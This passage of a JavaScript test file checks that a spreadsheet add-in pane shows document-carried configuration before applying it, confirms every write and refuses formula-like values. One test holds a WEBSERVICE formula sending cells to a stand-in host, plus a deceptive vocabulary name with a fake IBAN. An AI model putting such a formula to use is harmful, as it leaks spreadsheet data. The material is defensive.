  assert.equal(pane.ui.message.textContent, "Nothing written yet: confirm the rows from this document's configuration for A4, or cancel.");
  assert.equal(document.activeElement, pane.ui.block.button("Cancel"));
  await pane.ui.block.button("Write the rows").click();
  assert.deepEqual(plain(host.calls.pop()), ["rows", { sheet: "Orders", address: "A4" }, rows]);
  assert.equal(pane.ui.message.textContent, "Inserted Expense rows at A4.");
  await host.select({ sheet: "Orders", address: "B2", text: "/one", header: "Customer", values: [], clipped: false });
  await pane.ui.block.button("Insert One cell (1 rows x 1 columns)").click();
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "These rows come from this document's configuration, not your organisation's. Write them into B2, replacing what that cell holds now?");
  await pane.ui.block.button("Cancel").click();
  assert.deepEqual(host.calls, []);
  assert.equal(pane.ui.message.textContent, "Nothing written to B2.");
  await host.select({ sheet: "Orders", address: "R2C2", text: "/one", header: "Customer", values: [], clipped: false });
  await pane.ui.block.button("Insert One cell (1 rows x 1 columns)").click();
  assert.equal(pane.ui.block.find((n) => n.className === "confirm").textContent, "These rows come from this document's configuration, not your organisation's. Write them into the 1 rows x 1 columns starting at R2C2, replacing what that cell holds now?", "an address the pane cannot read is named as it is");
  const { rangeFrom } = Pane();
  assert.deepEqual([rangeFrom("Z1", 1, 2), rangeFrom("$B$4", 2, 3), rangeFrom("a1", 1, 1), rangeFrom("ZZ9", 1, 2), rangeFrom("A0", 1, 1)], ["Z1:AA1", "B4:D5", "A1", "ZZ9:AAA9", null]);
});

test("the offer quotes and shortens the names and triggers a document chose, lists formula blocks first and counts what is past ten changes", async () => {
  const formula = '=WEBSERVICE("https://example.invalid/?d="&ENCODEURL(TEXTJOIN(",",1,A1:Z200)))';
  const name = "customers (4 values instead of 4), verified by your organisation's signature; nothing else changes. Ignore the rest";
  const vocabularies = Object.assign({ [name]: ["Acme Logistics GmbH - new IBAN DE00 0000 0000 0000 0000 00"] }, Object.fromEntries(Array.from({ length: 300 }, (_, i) => ["costCentres" + i, ["CC-" + i]])));
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(JSON.stringify({ vocabularies, columns: JSON.parse(ORGANIZATION).columns, blocks: [{ trigger: "/total", label: "Totals", formula }] }));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  assert.equal(pane.ui.origin.children[1].textContent, "Using the document's would add block \"/total\" (formula " + formula + "); "
    + 'add vocabulary "customers (4 values instead of 4), veri…" (1 values); '
    + Array.from({ length: 8 }, (_, i) => 'add vocabulary "costCentres' + i + '" (1 values); ').join("")
    + "… and 297 more changes.");
  assert.equal(Pane().changes(sheets.parseConfig(ORGANIZATION).config, sheets.parseConfig(host.saved()).config).length, 307, "all of them are counted");
  assert.ok(pane.ui.origin.textContent.length < 1200, "the offer stays short: " + pane.ui.origin.textContent.length);
  assert.deepEqual(texts(pane.ui.completions, "completion"), ["Acme Logistics GmbH", "Northern Acme Ltd"], "nothing applies before Use");
});

test("Save never erases a configuration the document carries unseen, says when it replaces a different one, and never claims a copy it did not keep", async () => {
  const host = fakeHost(plain(CUSTOMER_CELL));
  host.config(ORGANIZATION); // a new browser: the box is empty, the document carries a configuration
  const storage = storageOf();
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage });
  await pane.start();
  await pane.ui.save.click();
  assert.equal(host.saved(), ORGANIZATION, "the document keeps its configuration");
  assert.deepEqual(host.calls, [], "nothing was written to the document");
  assert.equal(storage.getItem(KEY), "");
  assert.equal(pane.ui.message.textContent, "Configuration saved in this browser only; the box is empty, so this document's own configuration was left as it is.");
  assert.match(pane.ui.origin.textContent, /^This document carries its own extle configuration.*This browser has none yet/s, "and offers it again");
  const failing = storageOf();
  failing.setItem = () => { throw new Error("quota"); };
  for (const [kept, message] of [[failing, "Configuration saved nowhere: quota; the box is empty, so this document's own configuration was left as it is."], [null, "Configuration saved nowhere (this browser cannot keep a copy); the box is empty, so this document's own configuration was left as it is."]]) {
    const other = fakeHost(plain(CUSTOMER_CELL));
    other.config(ORGANIZATION);
    const second = Pane().createPane({ document, root: new Node("div"), bridge: other.bridge, core: sheets, storage: kept });
    await second.start();
    await second.ui.save.click();
    assert.equal(second.ui.message.textContent, message);
    assert.equal(other.saved(), ORGANIZATION);
  }
  const pasted = JSON.stringify({ vocabularies: { customers: ["Acme Logistics GmbH"] }, columns: [{ match: { header: "^customer" }, vocabulary: "customers" }] });
  pane.ui.configText.value = pasted;
  await pane.ui.save.click();
  assert.equal(host.saved(), pasted, "what the person pasted replaces it");
  assert.equal(pane.ui.message.textContent, "Configuration saved with this document, in place of the different configuration it carried.");
  assert.equal(pane.ui.origin.textContent, "");
  await pane.ui.save.click();
  assert.equal(pane.ui.message.textContent, "Configuration saved with this document.", "the same one again replaces nothing");
  const locked = fakeHost(plain(CUSTOMER_CELL));
  locked.bridge.saveConfig = async () => { throw new Error("settings locked"); };
  const third = Pane().createPane({ document, root: new Node("div"), bridge: locked.bridge, core: sheets, storage: null });
  await third.start();
  third.ui.configText.value = ORGANIZATION;
  await third.ui.save.click();
  assert.equal(third.ui.message.textContent, "Configuration saved nowhere: settings locked (this browser cannot keep a copy).", "not \"in this browser only\": there is no browser copy");
  assert.deepEqual(texts(third.ui.completions, "completion"), ["Acme Logistics GmbH", "Northern Acme Ltd"], "it still applies for this session");
});

// A cost centre column, strict in the sample section: C4 is selected (its own text "cc" is checked too).
const COST_CELL = { sheet: "Budget", address: "C4", text: "cc", header: "Cost centre", values: ["CC-100 Logistics", "sales", "cc-300  warehouse", "CC-999 Old", "", "CC-200 Sales", "Travel"], rows: [2, 3, 5, 6, 7, 8, 9], clipped: false };

// fakeHost plus the strict-column calls: replaceValues re-reads `column` (row -> text) and writes there; list validation is recorded.
function strictHost(initial, options) {
  const settings = options || {};
  const host = fakeHost(initial);
  host.column = Object.assign({}, settings.column);
  host.bridge.replaceValues = async (target, list) => {
    host.calls.push(["replace", target, list]);
    const written = [];
    const skipped = [];
    for (const change of list) {
      if (host.column[change.row] !== change.from) skipped.push({ row: change.row, text: host.column[change.row] });
      else host.column[change.row] = change.to, written.push(change.row);
    }
    return { written, skipped };
  };
  host.bridge.listValidation = settings.validation === null ? null : Object.assign({
    apply: async (target, values, message) => { host.calls.push(["validate", target, values, message]); return { range: target.column + "2:" + target.column + "1048576" }; },
    remove: async (target) => { host.calls.push(["unvalidate", target]); return { range: target.column + "2:" + target.column + "1048576" }; },
  }, settings.validation);
  if (settings.missing) host.bridge.listValidationMissing = settings.missing;
  return host;
}

const columnOf = (cell) => Object.fromEntries(cell.values.map((text, i) => [cell.rows[i], text]).concat([[Number(cell.address.slice(1)), cell.text]]));

test("a strict column: completions only from the list, the line that says so, and nothing for a column that is not strict", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  assert.equal(pane.ui.context.textContent, 'C4 on Budget, column "Cost centre": vocabulary costCentres');
  assert.equal(pane.ui.strict.children[0].textContent, 'Only values from the "costCentres" list.');
  assert.deepEqual(texts(pane.ui.completions, "completion"), ["CC-200 Sales", "CC-100 Logistics", "CC-300 Warehouse"], "the column's own CC-999 Old is not offered; its alias counts towards CC-200 Sales");
  pane.ui.input.value = "CC-9";
  await pane.ui.input.fire("input");
  assert.equal(pane.ui.completions.textContent, "No completion.");
  pane.ui.input.value = "sal";
  await pane.ui.input.fire("input");
  assert.deepEqual(texts(pane.ui.completions, "completion"), ["CC-200 Sales"], "an alias leads to the list's value");
  assert.deepEqual(texts(pane.ui.completions, "source"), ["alias Sales, vocabulary"]);
  await host.select(plain(CUSTOMER_CELL));
  assert.equal(pane.ui.strict.textContent, "", "the customers column is not strict in the organisation's configuration");
  assert.deepEqual(texts(pane.ui.completions, "completion"), ["Acme Logistics GmbH", "Northern Acme Ltd"]);
  await host.select(Object.assign(plain(COST_CELL), { address: "R4C3" }));
  assert.equal(pane.ui.strict.textContent, 'Only values from the "costCentres" list.', "an address the pane cannot read: the line, but no column tools");
  assert.equal(pane.ui.strict.button("Check this column"), null);
});

test("Check this column lists aliases and unknown values with their rows; Replace writes the list's spelling only after a confirmation, and skips a cell that changed", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  const summary = "Column C: 7 cells with text checked; 2 match the list, 2 can take the list's spelling, 3 are not in the list.";
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary").textContent, summary);
  assert.equal(pane.ui.message.textContent, summary);
  const lists = pane.ui.strict.all((n) => n.tagName === "ul");
  assert.deepEqual(lists.map((list) => list.attrs["aria-label"]), ["Cells that can take the list's spelling", "Cells not in the list"]);
  assert.deepEqual(lists[0].all((n) => n.tagName === "li").map((n) => n.textContent), ['C3: "sales" → "CC-200 Sales"', 'C5: "cc-300  warehouse" → "CC-300 Warehouse"']);
  assert.deepEqual(lists[1].all((n) => n.tagName === "li").map((n) => n.textContent), ['C4: "cc"', 'C6: "CC-999 Old"', 'C9: "Travel"'], "the selected cell is checked too; unknown values are only listed");
  assert.deepEqual(host.calls, [], "a check writes nothing");
  await pane.refresh();
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary").textContent, summary, "a poll of the same column keeps the result");
  const replace = pane.ui.strict.button("Replace 2 cells with the list's spelling");
  await replace.click();
  assert.deepEqual(host.calls, [], "the button alone writes nothing");
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm").textContent, 'Write the list\'s spelling into 2 cells of column C on "Budget", as listed above? Each cell is read again first; one that changed since the check, or that holds a formula, is left as it is.', "only what every bridge does; this bridge adds no note");
  assert.equal(pane.ui.message.textContent, "Nothing written yet: confirm the list's spelling for 2 cells in column C, or cancel.");
  assert.equal(document.activeElement, pane.ui.strict.button("Cancel"), "Cancel has the focus, so a second Enter cannot confirm");
  assert.equal(pane.ui.strict.button("Replace 2 cells").attrs["aria-describedby"], "actle-strict-question actle-strict-fixes");
  assert.equal(pane.ui.strict.button("Check this column"), null, "no other column tool while the question is open");
  assert.equal(pane.ui.strict.button("Replace 2 cells with the list's spelling"), null, "nor a second Replace that would open another question");
  assert.equal(pane.ui.strict.button("Turn on list validation for this column"), null);
  await pane.refresh();
  assert.ok(pane.ui.strict.button("Replace 2 cells"), "a poll keeps the question");
  assert.equal(document.activeElement, pane.ui.strict.button("Cancel"), "and the focus follows the redrawn Cancel");
  const stale = pane.ui.strict.button("Replace 2 cells");
  await pane.ui.strict.button("Cancel").click();
  assert.equal(pane.ui.message.textContent, "Nothing changed in column C.");
  assert.equal(document.activeElement, pane.ui.strict.button("Replace 2 cells with the list's spelling"), "the focus goes back to Replace");
  await stale.click();
  assert.deepEqual(host.calls, [], "a button from a question that is gone writes nothing");
  host.column[5] = "CC-300 Warehouse"; // someone corrects C5 by hand after the check
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  await pane.ui.strict.button("Replace 2 cells").click();
  assert.deepEqual(plain(host.calls.shift()), ["replace", { sheet: "Budget", column: "C" }, [{ row: 3, from: "sales", to: "CC-200 Sales" }, { row: 5, from: "cc-300  warehouse", to: "CC-300 Warehouse" }]], "exactly the listed cells, with what the check read");
  assert.equal(host.column[3], "CC-200 Sales");
  assert.equal(pane.ui.message.textContent, 'Wrote the list\'s spelling into 1 cell of column C. Skipped 1 cell that changed since the check: C5 (now "CC-300 Warehouse").');
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "the old result is gone; the column is read again");
  assert.equal(document.activeElement, pane.ui.strict.button("Check this column"));
  assert.equal(host.column[6], "CC-999 Old", "unknown values are never changed");
  host.bridge.replaceValues = async () => { throw new Error("the sheet is protected"); };
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  await pane.ui.strict.button("Replace 2 cells").click();
  assert.equal(pane.ui.message.textContent, "Could not write the list's spelling into column C: the sheet is protected. Cells written before the error, if any, keep the list's spelling.");
  assert.ok(pane.ui.strict.find((n) => n.className === "check-summary"), "the check stays, so the person can try again");
  assert.equal(document.activeElement, pane.ui.strict.button("Replace 2 cells with the list's spelling"));
});

test("a check is dropped with its question when the cell moves to another column or the configuration changes; a pane without row numbers says so", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  const stale = pane.ui.strict.button("Replace 2 cells");
  await host.select(Object.assign(plain(COST_CELL), { address: "C5", text: "cc-300  warehouse" }));
  assert.ok(pane.ui.strict.button("Replace 2 cells"), "another cell of the same column keeps the question");
  await host.select(Object.assign(plain(COST_CELL), { address: "D4" }));
  assert.equal(pane.ui.strict.button("Replace 2 cells"), null, "another column drops it");
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "and the check");
  assert.equal(pane.ui.message.textContent, "", "and its notice");
  await stale.click();
  await host.select(plain(COST_CELL));
  assert.equal(pane.ui.strict.button("Replace 2 cells"), null, "it does not come back with the first column");
  assert.deepEqual(host.calls, []);
  await pane.ui.strict.button("Check this column").click();
  pane.ui.configText.value = ORGANIZATION;
  await pane.ui.save.click();
  assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "a saved configuration starts afresh");
  host.calls.length = 0;
  const old = strictHost(Object.assign(plain(COST_CELL), { rows: undefined }));
  const older = Pane().createPane({ document, root: new Node("div"), bridge: old.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await older.start();
  await older.ui.strict.button("Check this column").click();
  assert.equal(older.ui.message.textContent, "Cannot check column C: the spreadsheet side of the add-in sent no row numbers. Update its files.");
  assert.equal(older.ui.strict.find((n) => n.className === "check-summary"), null);
});

test("list validation is turned on and removed only after a confirmation; a list the host cannot take, a host without it and a host error are said", async () => {
  const host = strictHost(plain(COST_CELL));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Turn on list validation for this column").click();
  assert.deepEqual(host.calls, []);
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm").textContent, 'Turn on list validation for column C on "Budget", from row 2 down? A value typed into those cells that is not one of the 3 values of the "costCentres" list is then refused. Values already in the column stay as they are, and a pasted value may not be checked. Data validation those cells have now is replaced.');
  assert.equal(pane.ui.message.textContent, "Nothing written yet: confirm list validation for column C, or cancel.");
  assert.equal(document.activeElement, pane.ui.strict.button("Cancel"));
  await pane.ui.strict.button("Cancel").click();
  assert.equal(document.activeElement, pane.ui.strict.button("Turn on list validation for this column"));
  assert.deepEqual(host.calls, []);
  await pane.ui.strict.button("Turn on list validation for this column").click();
  await pane.ui.strict.button("Turn it on").click();
  assert.deepEqual(plain(host.calls.shift()), ["validate", { sheet: "Budget", column: "C" }, ["CC-100 Logistics", "CC-200 Sales", "CC-300 Warehouse"], 'Only values from the "costCentres" list.'], "the list's values only, no aliases");
  assert.equal(pane.ui.message.textContent, 'List validation is on for C2:C1048576 on "Budget": a value typed there that is not in the "costCentres" list is refused. Values already there are not checked; Check this column lists them.');
  await pane.ui.strict.button("Remove list validation").click();
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm").textContent, 'Remove the data validation from column C on "Budget", from row 2 down? This clears any data validation those cells have, not only a list turned on here.');
  assert.equal(pane.ui.message.textContent, "Nothing changed yet: confirm removing the data validation from column C, or cancel.");
  assert.deepEqual(host.calls, []);
  await pane.ui.strict.button("Remove it").click();
  assert.deepEqual(plain(host.calls.shift()), ["unvalidate", { sheet: "Budget", column: "C" }]);
  assert.equal(pane.ui.message.textContent, 'Removed the data validation from C2:C1048576 on "Budget".');
  host.bridge.listValidation.apply = async () => { throw new Error("the sheet is protected"); };
  await pane.ui.strict.button("Turn on list validation for this column").click();
  await pane.ui.strict.button("Turn it on").click();
  assert.equal(pane.ui.message.textContent, "Could not turn on list validation for column C: the sheet is protected. Data validation those cells had before may already be cleared.", "Excel clears the old rule first in the same batch");
  host.bridge.listValidation.apply = async () => { throw new Error("The rule is not valid."); };
  await pane.ui.strict.button("Turn on list validation for this column").click();
  await pane.ui.strict.button("Turn it on").click();
  assert.equal(pane.ui.message.textContent, "Could not turn on list validation for column C: The rule is not valid. Data validation those cells had before may already be cleared.", "one full stop before the note");
  host.bridge.listValidation.remove = async () => { throw new Error("The range is protected."); };
  await pane.ui.strict.button("Remove list validation").click();
  await pane.ui.strict.button("Remove it").click();
  assert.equal(pane.ui.message.textContent, "Could not remove the data validation from column C: The range is protected.", "no note, so the host's message is kept as it is");
  const refusing = strictHost(plain(COST_CELL), { validation: { refusal: (values) => (values.length > 2 ? "it has more values than this test allows" : null) } });
  const refused = Pane().createPane({ document, root: new Node("div"), bridge: refusing.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await refused.start();
  assert.equal(refused.ui.strict.find((n) => n.className === "hint").textContent, "List validation is not available for this list: it has more values than this test allows.");
  assert.equal(refused.ui.strict.button("Turn on list validation for this column"), null);
  assert.ok(refused.ui.strict.button("Remove list validation"), "removing stays possible");
  const without = strictHost(plain(COST_CELL), { validation: null, missing: "List validation is not offered: this Excel does not have ExcelApi 1.8." });
  const plainHost = Pane().createPane({ document, root: new Node("div"), bridge: without.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await plainHost.start();
  assert.equal(plainHost.ui.strict.find((n) => n.className === "hint").textContent, "List validation is not offered: this Excel does not have ExcelApi 1.8.");
  assert.equal(plainHost.ui.strict.button("Remove list validation"), null);
  assert.ok(plainHost.ui.strict.button("Check this column"), "the check does not need the host's validation");
});

test("a strict rule from a document's configuration does nothing before Use, and after Use its replacement and validation name where the list comes from", async () => {
  const doc = JSON.parse(ORGANIZATION);
  doc.columns[0] = Object.assign({}, doc.columns[0], { strict: true });
  const cell = { sheet: "Orders 2026", address: "B4", text: "acm", header: "Customer", values: ["ACME", "Zed AG", "Birch & Co"], rows: [2, 3, 5], clipped: false };
  const host = strictHost(plain(cell), { column: columnOf(cell) });
  host.config(JSON.stringify(doc));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  assert.match(pane.ui.origin.textContent, /would replace the column rules \(3 instead of 3\)/, "the strict flag is a change the offer names");
  assert.equal(pane.ui.strict.textContent, "", "the organisation's customers column is not strict");
  await pane.ui.origin.button("Use the document's configuration").click();
  assert.equal(pane.ui.strict.children[0].textContent, 'Only values from the "customers" list.');
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 1 alias with the list's spelling").click();
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm").textContent, 'This list comes from this document\'s configuration, not your organisation\'s. Write the list\'s spelling into 1 cell of column B on "Orders 2026", as listed above? Each cell is read again first; one that changed since the check, or that holds a formula, is left as it is.');
  const stale = pane.ui.strict.button("Replace 1 cell");
  await pane.ui.origin.button("Stop using it").click();
  assert.equal(pane.ui.strict.textContent, "", "back to the organisation's rules: no strict column, no question");
  await stale.click();
  assert.deepEqual(host.calls, [], "a question from the document's configuration left behind writes nothing");
  await pane.ui.origin.button("Use the document's configuration").click();
  await pane.ui.strict.button("Turn on list validation for this column").click();
  assert.match(pane.ui.strict.find((n) => n.className === "confirm").textContent, /^This list comes from this document's configuration, not your organisation's\. Turn on list validation for column B on "Orders 2026"/);
  await pane.ui.strict.button("Turn it on").click();
  assert.deepEqual(plain(host.calls.shift()).slice(0, 3), ["validate", { sheet: "Orders 2026", column: "B" }, ["Acme Logistics GmbH", "Birch & Co", "Northern Acme Ltd", "Zed Transport"]]);
});

test("the pane refuses a full-width formula start as it does a half-width one", async () => {
  const host = fakeHost({ sheet: "Orders 2026", address: "D4", text: "＋49 reached. Prom", header: "Delivery notes", values: NOTES, clipped: false });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.completions.all((n) => n.className === "completion")[0].click();
  assert.deepEqual(host.calls, [], "nothing was written");
  assert.equal(pane.ui.message.textContent, 'Not written to D4: starting with "＋", the cell could read it as a formula. Change the first character, then choose again.');
  pane.ui.configText.value = JSON.stringify({ vocabularies: { codes: ["＝SUM(A1)", "A-1"] }, blocks: [{ trigger: "/x", rows: [["＠x"]] }] });
  await pane.ui.save.click();
  assert.equal(pane.ui.summary.textContent, '1 vocabularies (codes), 0 column rules, 0 blocks. Skipped: sheets vocabulary codes: value "＝SUM(A1)" ignored: a cell would read it as a formula; sheets block /x ignored: the cell in row 1, column 1 starts with "＠", which a cell would read as a formula');
});

test("after a replacement the pane reads the column again and reports cells a formula fills and a write that stopped; a label says aliases only when every fix is one", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  let reads = 0;
  const read = host.bridge.readContext;
  host.bridge.readContext = () => (reads++, read());
  // The written cells reach the selection the pane reads next, as in a spreadsheet.
  const write = host.bridge.replaceValues;
  host.bridge.replaceValues = async (target, list) => {
    const result = await write(target, list);
    const selection = host.current();
    for (const row of result.written) selection.values[selection.rows.indexOf(row)] = host.column[row];
    return result;
  };
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  await pane.ui.strict.button("Replace 2 cells with the list's spelling").click();
  const before = reads;
  await pane.ui.strict.button("Replace 2 cells").click();
  assert.equal(reads, before + 1, "the selection is read again after the write");
  assert.equal(pane.ui.message.textContent, "Wrote the list's spelling into 2 cells of column C.");
  await pane.ui.strict.button("Check this column").click();
  assert.equal(pane.ui.message.textContent, "Column C: 7 cells with text checked; 4 match the list, 0 can take the list's spelling, 3 are not in the list.", "the new check sees the written cells");
  assert.equal(pane.ui.strict.button("Replace 0 cells with the list's spelling"), null, "nothing left to replace");
  // Only aliases: the owner's wording.
  const aliases = strictHost(Object.assign(plain(COST_CELL), { values: ["Sales", "sales", "CC-999 Old"], rows: [2, 3, 5] }));
  const second = Pane().createPane({ document, root: new Node("div"), bridge: aliases.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await second.start();
  await second.ui.strict.button("Check this column").click();
  assert.ok(second.ui.strict.button("Replace 2 aliases with the list's spelling"));
  aliases.bridge.replaceValues = async () => ({ written: [2], skipped: [], computed: [3], failed: { row: 5, message: "the range is protected" } });
  await second.ui.strict.button("Replace 2 aliases with the list's spelling").click();
  await second.ui.strict.button("Replace 2 cells").click();
  assert.equal(second.ui.message.textContent, "Wrote the list's spelling into 1 cell of column C, then stopped at C5 (the range is protected); nothing after it was written. Left 1 cell whose value comes from a formula: C3.");
  assert.equal(second.ui.strict.find((n) => n.className === "check-summary"), null, "cells changed, so the old check is gone and a retry starts from a new check");
  aliases.bridge.replaceValues = async () => ({ written: [], skipped: [], computed: [], failed: { row: null, message: "unknown error" } });
  await second.ui.strict.button("Check this column").click();
  await second.ui.strict.button("Replace 2 aliases with the list's spelling").click();
  await second.ui.strict.button("Replace 2 cells").click();
  assert.equal(second.ui.message.textContent, "Wrote the list's spelling into 0 cells of column C, then stopped (unknown error); nothing after it was written.");
});

test("a column check lists ten cells under each heading and counts the rest, says when only the first rows were read, and caps a long replacement report", async () => {
  const values = [];
  for (let i = 0; i < 12; i++) values.push("sales");
  for (let i = 0; i < 13; i++) values.push("Old " + i);
  const rows = values.map((_, i) => i + 5);
  const cell = Object.assign(plain(COST_CELL), { address: "C2", text: "CC-100 Logistics", values, rows, clipped: true });
  const host = strictHost(cell);
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  assert.equal(pane.ui.message.textContent, "Column C: 26 cells with text checked (first rows only); 1 match the list, 12 can take the list's spelling, 13 are not in the list.");
  const lists = pane.ui.strict.all((n) => n.tagName === "ul").map((list) => list.all((n) => n.tagName === "li").map((n) => n.textContent));
  assert.deepEqual(lists[0], Array.from({ length: 10 }, (_, i) => "C" + (i + 5) + ': "sales" → "CC-200 Sales"').concat("… and 2 more"));
  assert.deepEqual(lists[1], Array.from({ length: 10 }, (_, i) => "C" + (i + 17) + ': "Old ' + i + '"').concat("… and 3 more"));
  host.bridge.replaceValues = async (target, list) => ({ written: [], skipped: [], computed: list.map((change) => change.row) });
  await pane.ui.strict.button("Replace 12 aliases with the list's spelling").click();
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm").textContent, 'Write the list\'s spelling into 12 cells of column C on "Budget", the 10 listed above and 2 more the check found? Each cell is read again first; one that changed since the check, or that holds a formula, is left as it is.', "the cells counted but not listed are written too, and the question says so");
  await pane.ui.strict.button("Replace 12 cells").click();
  assert.equal(pane.ui.message.textContent, "Wrote the list's spelling into 0 cells of column C. Left 12 cells whose value comes from a formula: C5, C6, C7, C8, C9, C10, C11, C12, C13, C14, … and 2 more.");
  await pane.ui.strict.button("Check this column").click();
  host.bridge.replaceValues = async (target, list) => ({ written: [], skipped: list.map((change) => ({ row: change.row, text: "x" })), computed: [] });
  await pane.ui.strict.button("Replace 12 aliases with the list's spelling").click();
  await pane.ui.strict.button("Replace 12 cells").click();
  assert.match(pane.ui.message.textContent, /Skipped 12 cells that changed since the check: C5 \(now "x"\), (C\d+ \(now "x"\), ){8}C14 \(now "x"\), … and 2 more\.$/);
});

test("the header cell of a strict column is never checked, also when it is the selected cell", async () => {
  const header = Object.assign(plain(COST_CELL), { address: "C1", text: "Cost centre", values: ["sales", "CC-999 Old"], rows: [2, 3] });
  const host = strictHost(header);
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  await pane.ui.strict.button("Check this column").click();
  assert.equal(pane.ui.message.textContent, "Column C: 2 cells with text checked; 0 match the list, 1 can take the list's spelling, 1 are not in the list.");
  const listed = pane.ui.strict.all((n) => n.tagName === "li").map((n) => n.textContent);
  assert.deepEqual(listed, ['C2: "sales" → "CC-200 Sales"', 'C3: "CC-999 Old"'], "C1 is neither counted nor listed");
});

test("buttons left from another column, or from a question that is gone, do nothing", async () => {
  const host = strictHost(plain(COST_CELL), { column: columnOf(COST_CELL) });
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  const check = pane.ui.strict.button("Check this column");
  const validate = pane.ui.strict.button("Turn on list validation for this column");
  const remove = pane.ui.strict.button("Remove list validation");
  await host.select(Object.assign(plain(COST_CELL), { address: "D4" })); // column D is a cost centre column too
  assert.equal(pane.ui.context.textContent, 'D4 on Budget, column "Cost centre": vocabulary costCentres');
  await pane.ui.strict.button("Turn on list validation for this column").click();
  await pane.ui.strict.button("Cancel").click();
  for (const stale of [check, validate, remove]) {
    await stale.click();
    assert.equal(pane.ui.strict.find((n) => n.className === "confirm"), null, "no question for column D from a column C button");
    assert.equal(pane.ui.strict.find((n) => n.className === "check-summary"), null, "and no check");
    assert.equal(pane.ui.message.textContent, "Nothing changed in column D.", "and the status line keeps what it said");
  }
  // A Cancel left from an earlier question does not cancel a newer one.
  await pane.ui.strict.button("Turn on list validation for this column").click();
  const oldCancel = pane.ui.strict.button("Cancel");
  await oldCancel.click();
  await pane.ui.strict.button("Remove list validation").click();
  await oldCancel.click();
  assert.ok(pane.ui.strict.button("Remove it"), "the newer question stays");
  assert.equal(pane.ui.message.textContent, "Nothing changed yet: confirm removing the data validation from column D, or cancel.");
  await pane.ui.strict.button("Remove it").click();
  assert.deepEqual(plain(host.calls), [["unvalidate", { sheet: "Budget", column: "D" }]], "only the confirmed removal, in column D");
});

test("a strict question or check made with the document's configuration ends with it, even when the organisation's makes the same column strict", async () => {
  const doc = JSON.parse(ORGANIZATION);
  doc.vocabularies.costCentres = { values: doc.vocabularies.costCentres.values.concat("CC-900 Document Only"), aliases: Object.assign({}, doc.vocabularies.costCentres.aliases, { Ops: "CC-900 Document Only" }) };
  const cell = Object.assign(plain(COST_CELL), { values: ["Ops", "CC-100 Logistics"], rows: [2, 3] });
  const host = strictHost(cell, { column: columnOf(cell) });
  host.config(JSON.stringify(doc));
  const pane = Pane().createPane({ document, root: new Node("div"), bridge: host.bridge, core: sheets, storage: storageOf({ [KEY]: ORGANIZATION }) });
  await pane.start();
  const use = () => pane.ui.origin.button("Use the document's configuration").click();
  const stop = () => pane.ui.origin.button("Stop using it").click();
  // An open validation question: Stop using it drops it.
  await use();
  await pane.ui.strict.button("Turn on list validation for this column").click();
  const turnOn = pane.ui.strict.button("Turn it on");
  assert.match(pane.ui.strict.find((n) => n.className === "confirm").textContent, /^This list comes from this document's configuration/);
  await stop();
  assert.equal(pane.ui.strict.find((n) => n.className === "confirm"), null, "the organisation's configuration starts without the document's question");
  assert.ok(pane.ui.strict.button("Turn on list validation for this column"), "the column is still strict, under the organisation's list");
  await turnOn.click();
  assert.deepEqual(host.calls, [], "the document's list is not written");
  // The same after Save.
  await use();
  await pane.ui.strict.button("Turn on list validation for this column").click();
